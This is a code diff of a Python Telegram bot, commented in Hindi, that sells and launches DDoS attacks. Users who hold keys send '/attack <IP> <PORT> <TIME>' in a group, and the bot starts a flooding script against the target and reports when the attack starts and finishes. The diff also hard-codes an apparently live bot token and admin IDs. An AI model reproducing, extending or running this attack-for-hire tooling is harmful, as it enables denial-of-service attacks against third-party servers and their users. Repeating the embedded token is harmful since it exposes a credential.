@@ -15,13 +15,9 @@ from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton  # ✅ FIXE
 # ✅ TELEGRAM BOT TOKEN
 bot = telebot.TeleBot('7053228704:AAGLAJFlzJ6M2XZC9HEABD6B5PVubnd-FqY')
 
+# ✅ GROUP AND ADMIN DETAILS
 GROUP_ID = "-1002369239894"
 ADMINS = ["7129010361"]
-ADMINS = [7129010361]
-MAX_ATTACKS_TIME = 100
-
-pending_verification = {}  # स्क्रीनशॉट वेरिफिकेशन ट्रैक करेगा
-active_attacks = {}  # एक्टिव अटैक ट्रैक करेगा
 
 SCREENSHOT_CHANNEL = "@KHAPITAR_BALAK77"
 
@@ -252,6 +248,20 @@ def remove_existing_key(message):
     else:
         bot.reply_to(message, "❌ KEY NOT FOUND!")
 
+# ✅ FIXED: SCREENSHOT SYSTEM (Now Always Forwards)
+@bot.message_handler(content_types=['photo'])
+def handle_screenshot(message):
+    user_id = message.from_user.id
+
+    caption_text = f"📸 **USER SCREENSHOT RECEIVED!**\n👤 **User ID:** `{user_id}`\n✅ **Forwarded to Admins!**"
+    file_id = message.photo[-1].file_id
+    bot.send_photo(SCREENSHOT_CHANNEL, file_id, caption=caption_text, parse_mode="Markdown")
+    
+    bot.reply_to(message, "✅ SCREENSHOT FORWARDED SUCCESSFULLY!")
+
+# ✅ Active Attacks को Track करने वाला Dictionary  
+active_attacks = {}
+
 # ✅ /MULTIUSERKEY Command (Admin Only)
 @bot.message_handler(commands=['multiuserkey'])
 def generate_multiuser_key(message):
@@ -335,30 +345,25 @@ def redeem_key(message):
 
     bot.reply_to(message, f"🎉 ACCESS GRANTED!\n👤 **User:** `{user_name}`\n🆔 **User ID:** `{user_id}`\n🔑 **Key:** `{key}`\n📅 **Expires On:** `{expiry_date.strftime('%Y-%m-%d %H:%M:%S IST')}`", parse_mode="Markdown")
 
-# ✅ Handle "/attack" Command
+# ✅ /attack Command (Attack Start + Finish Message)  
 @bot.message_handler(commands=['attack'])
 def handle_attack(message):
-    user_id = message.from_user.id
-    first_name = message.from_user.first_name or "Unknown"
-    username = message.from_user.username or "No Username"
-
-    safe_name = re.escape(first_name)  
-    safe_username = f"@{re.escape(username)}" if username != "No Username" else "No Username"
+    user_id = str(message.from_user.id)
 
     # ✅ सिर्फ ग्रुप में काम करेगा  
     if str(message.chat.id) != GROUP_ID:
         bot.reply_to(message, "🚫 **YE BOT SIRF GROUP ME CHALEGA!** ❌")
         return
 
-    # ✅ पहले से कोई पेंडिंग वेरिफिकेशन है तो नया अटैक ब्लॉक करो  
-    if user_id in pending_verification:
-        bot.reply_to(message, "🚫 **PEHLE PURANE ATTACK KA SCREENSHOT BHEJ, TABHI NAYA ATTACK LAGEGA!**")
+    # ✅ सिर्फ अलाउड यूज़र ही अटैक कर सकते हैं  
+    if user_id not in ADMINS:
+        bot.reply_to(message, "❌ **AAPKO ATTACK START KARNE KI PERMISSION NAHI HAI!**")
         return
 
     # ✅ सही कमांड फॉर्मेट चेक करें  
     command = message.text.split()
     if len(command) != 4:
-        bot.reply_to(message, "⚠ **USAGE:** /attack <IP> <PORT> <TIME>\n📌 **Example:** `/attack 1.1.1.1 80 60`", parse_mode="MarkdownV2")
+        bot.reply_to(message, "⚠ **USAGE:** /attack <IP> <PORT> <TIME>")
         return
 
     target, port, time_duration = command[1], command[2], command[3]
@@ -370,51 +375,24 @@ def handle_attack(message):
         bot.reply_to(message, "❌ **PORT AUR TIME SIRF NUMBERS ME HONA CHAHIYE!**")
         return
 
-    if time_duration > MAX_ATTACK_TIME:
-        bot.reply_to(message, f"🚫 **FREE ATTACK TIME {MAX_ATTACK_TIME} SECONDS HAI!**")
+    if time_duration > 100:
+        bot.reply_to(message, "🚫 **FREE ATTACK TIME 100 SECONDS HAI!**")
         return
 
-    # ✅ Screenshot Verification Required  
-    pending_verification[user_id] = True
+    # ✅ Multivps.py को सही से रन करें  
+    try:
+        subprocess.Popen(["python3", "free.py", target, str(port), str(time_duration)])
+        bot.reply_to(message, f"🚀 **Attack Started! /stats **\n🎯 **Target:** `{target}`\n🔢 **Port:** `{port}`\n⏳ **Duration:** `{time_duration}s`", parse_mode="Markdown")
 
-    bot.send_message(
-        message.chat.id,
-        f"📸 **{safe_name} ({safe_username})! TURANT SCREENSHOT BHEJ!**\n"
-        f"⚠ **AGAR NAHI DIYA TO NEXT ATTACK BLOCK HO JAYEGA!**",
-        parse_mode="MarkdownV2"
-    )
+        # ✅ Attack Finish Message भेजने के लिए Timer सेट करें  
+        def send_attack_finished():
+            time.sleep(time_duration)
+            bot.send_message(message.chat.id, f"✅ **Attack Finished!**\n🎯 **Target:** `{target}`\n🔢 **Port:** `{port}`", parse_mode="Markdown")
 
-    # ✅ Screenshot Check Function (2 Min का Timer)  
-    def wait_for_screenshot():
-        time.sleep(120)  # 2 Minutes  
-        if user_id in pending_verification:  
-            bot.send_message(message.chat.id, f"❌ **{safe_name} KA ATTACK BLOCK HO GAYA! SCREENSHOT NAHI DIYA!**")
-            pending_verification.pop(user_id, None)  
+        threading.Thread(target=send_attack_finished, daemon=True).start()
 
-    threading.Thread(target=wait_for_screenshot, daemon=True).start()
-
-@bot.message_handler(content_types=['photo'])
-def handle_screenshot(message):
-    user_id = message.from_user.id
-    first_name = message.from_user.first_name or "Unknown"
-    username = message.from_user.username or "No Username"
-
-    safe_name = re.escape(first_name)  
-    safe_username = f"@{re.escape(username)}" if username != "No Username" else "No Username"
-
-    if user_id in pending_verification:
-        pending_verification.pop(user_id, None)  # ✅ Screenshot मिलने के बाद block हटाओ  
-
-        bot.send_message(message.chat.id, "✅ **SCREENSHOT VERIFIED! AB NAYA ATTACK KAR SAKTE HO!**")
-
-        # ✅ Screenshot Forward to Screenshot Channel  
-        bot.forward_message(SCREENSHOT_CHANNEL, message.chat.id, message.message_id)
-
-        bot.send_message(
-            SCREENSHOT_CHANNEL,
-            f"📸 **Screenshot Received!**\n👤 **User:** {safe_name} ({safe_username})",
-            parse_mode="MarkdownV2"
-        )
+    except Exception as e:
+        bot.reply_to(message, f"❌ **Attack Start Karne Me Error Aaya!**\n🛠 **Error:** `{str(e)}`", parse_mode="Markdown")
 
 #  ✅ `/vipattack` (Max 300 sec, Only for VIP Users)  
 @bot.message_handler(commands=['bgmi'])
@@ -641,45 +619,8 @@ def check_vps(message):
     else:
         bot.reply_to(message, "❌ NO VPS FOUND!")
 
-# ✅ ATTACK STATS COMMAND
-@bot.message_handler(commands=['check'])
-def attack_stats(message):
-    user_id = message.from_user.id
-    now = datetime.datetime.now()
-
-    for user in list(active_attacks.keys()):
-        if active_attacks[user][2] <= now:
-            del active_attacks[user]
-
-    if not active_attacks:
-        bot.reply_to(message, "📊 **FREE ATACK NHI CHAL RAHA!** ❌")
-        return
-
-    stats_message = "📊 **ACTIVE ATTACKS:**\n\n"
-    for user, (target, port, end_time) in active_attacks.items():
-        remaining_time = (end_time - now).total_seconds()
-        stats_message += (
-            f"👤 **USER ID:** `{user}`\n"
-            f"🎯 **TARGET:** `{target}`\n"
-            f"📍 **PORT:** `{port}`\n"
-            f"⏳ **ENDS IN:** `{int(remaining_time)}s`\n"
-            f"🕒 **END TIME:** `{end_time.strftime('%H:%M:%S')}`\n\n"
-        )
-
-    bot.reply_to(message, stats_message, parse_mode="Markdown")
-
-# ✅ ADMIN RESTART COMMAND
-@bot.message_handler(commands=['restart'])
-def restart_bot(message):
-    if message.from_user.id in ADMINS:
-        bot.send_message(message.chat.id, "♻️ BOT RESTART HO RAHA HAI...")
-        time.sleep(1)
-        subprocess.run("python3 m.py", shell=True)
-    else:
-        bot.reply_to(message, "🚫 SIRF ADMIN HI RESTART KAR SAKTA HAI!")
-
 # ✅ /CHECK Command (List Active Keys)
-@bot.message_handler(commands=['keylist'])
+@bot.message_handler(commands=['check'])
 def check_keys(message):
     if str(message.chat.id) not in ADMINS:
         bot.reply_to(message, "❌ ADMIN ONLY COMMAND!")
